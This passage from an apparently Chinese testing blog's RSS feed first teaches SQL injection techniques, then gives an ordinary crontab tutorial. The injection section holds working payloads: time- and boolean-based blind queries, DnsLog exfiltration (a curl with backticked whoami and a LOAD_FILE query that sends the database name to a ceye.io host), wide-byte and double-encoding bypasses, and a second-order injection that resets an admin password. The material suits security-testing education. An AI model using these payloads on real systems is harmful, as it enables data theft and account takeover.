<p>这样就成功的测试出了该参数是存在注入漏洞的</p>
<p>通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回<code>true</code>那么我们的判断则是正确的，否则是错误的</p>
<h3 id="时间盲注">时间盲注</h3>
<ul>
<li>
<p>当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造<code>sql</code>语句，通过相应时间来判断盲注的成功与否</p>
</li>
<li>
<p>示例：</p>
<ul>
<li>编写逻辑<code>sql</code>，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">if</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p>如果<code>left(user(),1)='a'</code>判断为真，则返回0，如果判断为假，则执行<code>sleep(3)</code></p>
</li>
</ul>
<h3 id="mysql中盲注的一些方法"><code>mysql</code>中盲注的一些方法</h3>
<ul>
<li><code>left()</code>函数：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p><code>database</code>显示数据库名称，<code>left</code>函数从左截取数据库名称的前N位</p>
<ul>
<li><code>regexp</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">regexp</span> <span class="s1">&#39;^r&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>正则表达式的用法，与<code>left()</code>用法相似，也是从左往右匹配，当匹配成功时则返回1</p>
<ul>
<li><code>substr</code>函数：用来截取字符串</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">()),</span><span class="mi">1</span><span class="err">，</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span><span class="err">截取查询结果的第一位</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>ascii</code>函数：可以将字符串转换为<code>ascii</code>码值，该方法可以避免单引号的出现，能适用于更多的场景</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>通过以上方法可以进行盲注测试</li>
</ul>
<h3 id="dnslog盲注"><code>DnsLog</code>盲注</h3>
<ul>
<li>当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。</li>
<li>所以需要一种方式，减少请求，直接返回查询结果，这里可以使用<code>DnsLog</code>实现注入</li>
</ul>
<h4 id="dnslog盲注原理"><code>DnsLog</code>盲注原理</h4>
<ul>
<li>
<p><code>DNS</code>在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息</p>
</li>
<li>
<p><code>DNS</code>的日志信息</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl xx.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>记录信息</th>
<th>详情</th>
<th>地址</th>
<th>方式</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://xx.r5ourp.ceye.io/">http://xx.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>xx.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl `whoami`.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>记录信息</th>
<th>详情</th>
<th>地址</th>
<th>方式</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://test.r5ourp.ceye.io/">http://test.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>test.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>上面使用反引号包起来的<code>whoami</code>被拿到服务器的终端去执行了，然后返回的结果放到了<code>whoami</code>的位置</p>
<p>白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了<code>DNS</code>的日志信息里面</p>
</li>
</ul>
</li>
<li>
<p><code>mysql</code>的<code>load_file()</code></p>
<ul>
<li>在<code>mysql</code>中，<code>load_file</code>函数可以发起请求，可以利用该函数发起请求，使用<code>DnsLog</code>接收请求，获取数据</li>
<li>语法：<code>SELECT LOAD_FILE(CONCAT('\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\abc'));</code>
<ul>
<li>通过SQL语句查询内容，作为请求的一部分，发送至<code>DnsLog</code></li>
<li>只要对这部分的语句进行构造，就能实现有回显的注入</li>
<li>但是对数据格式和内容有限制，只能写入指定的内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="宽字节注入">宽字节注入</h3>
<h4 id="什么是宽字节">什么是宽字节</h4>
<ul>
<li>
<p>长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节</p>
</li>
<li>
<p>当程序对入参做过简单判断时，比如说将单引号转义成<code>\'</code>，而当<code>mysql</code>在使用<code>GBK</code>编码时，会认为两个字符为一个汉字</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>处理</th>
<th>编码</th>
<th>转义</th>
<th>SQL</th>
</tr>
</thead>
<tbody>
<tr>
<td>%df'</td>
<td><code>%df\'</code></td>
<td>%df%5C%27</td>
<td>運'</td>
<td>id=運' and</td>
</tr>
</tbody>
</table>
<p>这样就可以成功注入了</p>
</li>
</ul>
<h3 id="二次编码注入">二次编码注入</h3>
<ul>
<li>当经过多次编码后的参数仍不符合要求是，即可造成<code>sql</code>注入</li>
<li>例如：<code>id=1%2527</code>
<ul>
<li>1.上面的id参数值在PHP自身编码中会被识别为<code>1%27</code></li>
<li>2.然后对<code>1%27</code>进行非法字符的转义，因为没有非法字符，所以直接跳过</li>
<li>3.此时如果程序中编写的代码对参数进行了转换的话，<code>1%27</code>就变成了1'</li>
<li>此时1&rsquo;被传入到数据库中是可以将<code>sql</code>截断的</li>
</ul>
</li>
</ul>
<h3 id="二次注入">二次注入</h3>
<h4 id="原理">原理</h4>
<ul>
<li>1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库</li>
<li>2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入</li>
</ul>
<h4 id="例子">例子</h4>
<p>假如该系统的数据库为<code>mysql</code></p>
<ul>
<li>
<p>1.先注册一个用户，用户名为<code>admin</code></p>
</li>
<li>
<p>2.再注册一个用户，用户名为<code>admin'#</code></p>
</li>
<li>
<p>3.然后修改<code>admin'#</code>用户的密码</p>
<p>当修改<code>admin'#</code>的时候就会产生SQL注入：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="c1">#&#39; and passwd = &#39;oldPassword&#39;
</span></code></pre></td></tr></table>
</div>
</div><p>可以看到上面的sql如果没有对<code>admin'#</code>做校验的话，那么就会成功注入，最终执行的sql为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>这样就成功的把admin用户的密码修改掉了</p>
</li>
<li>
<p>如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作</p>
</li>
<li>
<p>这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面</p>
</li>
</ul>
]]></description>
</item><item>
    <title>crontab</title>
    <link>https://testoai.github.io/posts/crontab/</link>
    <pubDate>Sun, 18 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/crontab/</guid>
    <description><![CDATA[<h2 id="介绍">介绍</h2>
<p><code>crontab</code>在<code>Linux</code>系统中用于执行定时任务，比如服务巡检，日志备份清理，数据库备份</p>
<p>在<code>Centos7</code>中，最小安装会有该服务，进程名是<code>crond</code></p>
<h2 id="crontab文件详解"><code>crontab</code>文件详解</h2>
<ul>
<li>
<p>1.<code>/var/spool/cron/</code>：该目录存放着每个用户设置的任务，文件以用户名命名</p>
</li>
<li>
<p>2.<code>/var/log/cron</code>：该文件是<code>crontab</code>的日志文件，当任务执行没有成功时可以查看该日志排查</p>
</li>
<li>
<p>3.<code>/etc/crontab</code>：该文件用来管理定时任务，默认有<code>root</code>用户可以编辑可以修改权限给其他用户编辑</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
<span class="nv">PATH</span><span class="o">=</span>/sbin:/bin:/usr/sbin:/usr/bin
<span class="nv">MAILTO</span><span class="o">=</span>root

<span class="c1"># For details see man 4 crontabs</span>

<span class="c1"># Example of job definition:</span>
<span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="顶部环境相关部分">顶部环境相关部分</h3>
<ul>
<li><code>SHELL=/bin/bash</code>：表示使用<code>/bin/bash</code>解释命令</li>
<li><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code>：表示到哪些目录寻找命令执行程序</li>
<li><code>MAILTO</code>：当某个任务执行有输出时，输出内容将发送到那个用户的邮箱，为空则不发送</li>
</ul>
<h3 id="底部定时任务配置部分">底部定时任务配置部分</h3>
<ul>
<li>下面是整个文件的核心部分</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="时间部分">时间部分</h4>
<p><code>* * * * *</code>表示的是时间配置</p>
<ul>
<li>第一个*表示分钟，取值范围在0~59之间的整数</li>
<li>第二个*表示小时，取值范围在0~23之间的整数</li>
<li>第三个*表示日期，根据下面指定月份中的天数取值</li>
<li>第四个*表示月份，取值范围在1~12之间的整数</li>
<li>第五个*表示星期，取值范围在1~7之间的整数</li>
</ul>
<p>特殊符号：</p>
<ul>
<li><code>*</code>：代表规则范围内的任意值，如果设置该值的是分钟，则在满足其他条件下的情况下，每分钟都会执行</li>
<li><code>,</code>：将指定的值隔开，如在分钟中使用，<code>1,18,23</code>，在满足其他条件情况下，在1、18、23分钟都会执行</li>
<li><code>-</code>：用于指定取值范围，如在分钟中使用，<code>1-5</code>，则表示的是1、2、3、4、5分钟</li>
<li><code>/</code>：用于指定时间的执行频率，如在分钟中使用，<code>0-30/2</code>，则表示的是在30分钟之内，每隔两分钟执行一次</li>
</ul>
<h4 id="时间配置验证">时间配置验证</h4>
<p><code>https://crontab.guru/</code></p>
<p>上面网址会对配置的时间验证</p>
<h4 id="命令部分">命令部分</h4>
<p><code>user-name command to be executed</code>表示的是用户和执行的命令</p>
<p>因为环境变量的原因，可能有很多在终端执行的命令，放到<code>crontab</code>里面执行不了，所以最好写绝对路径</p>
<p>环境变量的问题下面会详细写下，现在先写一个例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback"># .---------------- minute (0 - 59)
# | .------------- hour (0 - 23)
# | | .---------- day of month (1 - 31)
# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...
# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# | | | | |
# * * * * * user-name command to be executed
  */2 * * * * /usr/sbin/ntpdate s1a.time.edu.cn
</code></pre></td></tr></table>
</div>
</div><p>上面的例子是每两分钟同步一次<code>s1a.time.edu.cn</code>的时间</p>
<h2 id="crontab的环境变量">crontab的环境变量</h2>
<p><code>crontab</code>默认不会加载用户和系统设置的环境变量，所以一些命令在终端可以执行但是在<code>crontab</code>执行不了</p>
<ul>
<li>解决方法
<ul>
<li>1.在<code>crontab</code>添加任务时写绝对路径</li>
<li>2.把刷新环境变量的命令添加到<code>crontab</code>中，只适用于<code>root</code>用户</li>
<li>3.可以在对应的任务之前添加一段使系统环境变量生效的命令</li>
<li>4.可以把要执行的文件所在目录添加到<code>PATH</code>中</li>
</ul>
</li>
</ul>
<h2 id="crontab相关命令">crontab相关命令</h2>
<p><code>crontab -l</code>：列出当前用户的所有任务</p>
<p><code>crontab -e</code>：编辑当前用户的任务，上面说普通用户没有办法把任务加到<code>/etc/crontab</code>中，但是可以使用这条命令添加属于自己的任务，格式与<code>/etc/crontab</code>相同</p>
<p><code>crontab /etc/crontab</code>：用于<code>root</code>用户编辑完<code>/etc/crontab</code>后刷新任务列表</p>
<p><code>crontab -r</code>：删除当前用户的所有任务，<strong><u>注意是删除所有，慎用</u></strong></p>
]]></description>
</item></channel>
</rss>
